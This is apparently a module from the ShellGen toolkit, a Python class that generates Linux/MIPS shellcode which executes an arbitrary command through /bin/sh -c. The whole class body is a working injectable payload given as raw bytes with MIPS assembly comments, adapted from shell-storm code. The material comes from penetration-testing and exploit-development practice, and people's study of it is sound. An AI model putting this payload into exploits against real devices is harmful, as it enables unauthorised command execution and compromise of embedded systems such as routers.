#!/usr/bin/env python

###############################################################################
## Execute any command on Linux/MIPS                                         ##
## Shellcode for ShellGen                                                    ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

__all__ = ["Execute"]

from shellgen import Dynamic

# Based on anonymous code found on the Internet
# http://www.shell-storm.org/shellcode/files/shellcode-141.php
class Execute (Dynamic):
    qualities = ("payload", "no_stack")
    encoding  = "term_null"

    def __init__(self, command):
        self.command = command
        if "\x00" in command:
            raise ValueError("Cannot have null chars in command: %r" % command)

    def compile(self, *argv, **argd):
        command = self.command
        if "\x00" in command:
            raise ValueError("Cannot have null chars in command: %r" % command)
        return (
            "\x04\x10\xff\xff"             #  bltzal  $zero,<_shellcode>
            "\x24\x02\x03\xf3"             #  li      $v0,1011
            "\x23\xff\x02\x14"             #  addi    $ra,$ra,532
            "\x23\xe4\xfe\x08"             #  addi    $a0,$ra,-504
            "\x23\xe5\xfe\x10"             #  addi    $a1,$ra,-496
            "\xaf\xe4\xfe\x10"             #  sw      $a0,-496($ra)
            "\xaf\xe0\xfe\x14"             #  sw      $zero,-492($ra)
            "\xa3\xe0\xfe\x0f"             #  sb      $zero,-497($ra)
            "\x03\xff\xff\xcc"             #  syscall
            "/bin/sh -c "
        ) + self.command + "\x00"
